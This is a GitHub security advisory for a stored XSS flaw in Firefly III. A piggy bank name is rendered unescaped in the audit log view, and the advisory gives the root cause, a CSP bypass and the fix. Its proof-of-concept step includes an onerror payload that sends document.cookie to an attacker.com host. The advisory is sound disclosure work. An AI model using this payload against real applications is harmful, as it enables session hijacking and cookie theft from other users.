# [M] Firefly II has Stored XSS in Audit Log Entry view via piggy bank name (ale.twig)

## Summary
Severity: Medium
Advisory: GHSA-6jq6-x4cx-qvcm
CWE: CWE-116, CWE-79
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N (CVSS_V4)
Published: 2026-06-12
Source: https://github.com/advisories/GHSA-6jq6-x4cx-qvcm
Type: github-advisory

## Affected
- Packagist: `grumpydictator/firefly-iii` — affected >=0 <6.6.3

## Details
## Summary

The Twig template `resources/views/list/ale.twig` renders the piggy bank name from `AuditLogEntry.after.piggy` using the `|raw` filter, bypassing Twig's auto-escaping. A piggy bank created with an HTML payload in its name executes arbitrary JavaScript in any browser viewing that transaction's audit log.

## Root Cause

The `|raw` filter is required on the outer `trans()` call to preserve `<span>` tags in the `amount` parameter (currency styling). However, this also disables escaping for the user-controlled `name` parameter.

**Vulnerable code (`resources/views/list/ale.twig` lines 107, 110):**
```twig
{{ trans('firefly.ale_action_log_add', {
    amount: formatAmountBySymbol(...),
    name: logEntry.after.piggy
})|raw }}
```

No HTML sanitization at storage time — `PiggyBankStoreRequest` only validates `min:1|max:255|uniquePiggyBankForUser`.

## Data Flow

```
POST /api/v1/piggy-banks {"name": "<img src=x onerror=...>"}
  → Stored verbatim in piggy_banks.name
  → Transaction rule fires add_to_piggy / remove_from_piggy
  → UpdatePiggyBank::handle() stores AuditLogEntry.after.piggy = raw name
  → Any user views /transactions/show/{id}
  → ale.twig outputs unescaped payload → XSS fires
```

## CSP Note

The nonce-based CSP (`script-src 'nonce-...' 'strict-dynamic'`) does **not** prevent this attack. Inline event handlers (`onerror`, `onload`) in HTML attributes are governed by `script-src-attr`, which is unrestricted in the current policy. The `<img onerror=...>` payload bypasses the nonce requirement entirely.

## PoC

1. Authenticate as any user
2. `POST /api/v1/piggy-banks` with `"name": "<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>"`
3. Create a rule: action = "Add money to piggy bank [attacker's piggy bank]"
4. Trigger the rule on any transaction
5. Visit `/transactions/show/{id}` → payload fires

**Confirmed server response (v6.6.2):**
```html
Added <span class="text-success money-positive">EUR 50.00</span> to piggy bank
"<img src=x onerror=alert(document.cookie)>"
```

## Impact

- Stored XSS persists in DB — fires for every user who views the transaction
- Cookie theft → session hijacking
- In multi-user setups: one user attacks another user or admin
- Chainable with CSRF-like operations

## Fix

PR #12271 (merged into `develop`): add `|e` to escape only the user-controlled `name` parameter.

```twig
{{ trans('firefly.ale_action_log_add', {
    amount: formatAmountBySymbol(...),
    name: logEntry.after.piggy|e
})|raw }}
```

## References
- https://github.com/firefly-iii/firefly-iii/security/advisories/GHSA-6jq6-x4cx-qvcm
- https://github.com/firefly-iii/firefly-iii/pull/12271
- https://github.com/firefly-iii/firefly-iii
